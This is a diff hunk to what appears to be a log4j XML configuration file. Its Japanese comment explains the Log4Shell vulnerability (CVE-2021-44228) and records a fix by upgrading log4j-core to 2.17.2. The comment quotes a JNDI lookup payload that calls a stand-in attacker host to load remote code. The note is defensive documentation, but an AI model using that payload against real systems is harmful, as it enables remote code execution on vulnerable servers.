@@ -3,6 +3,7 @@
   CVE-2021-44228 (Log4Shell): log4j-core 2.14.1 では
   JNDI Lookup が既定で有効。ユーザー入力をログ出力するだけで
   ${jndi:ldap://attacker.com/x} が評価され任意コード実行が発生する。
+  build.gradle.kts で log4j-core 2.17.2 に更新して修正済み。
 -->
 <Configuration status="WARN">
     <Appenders>
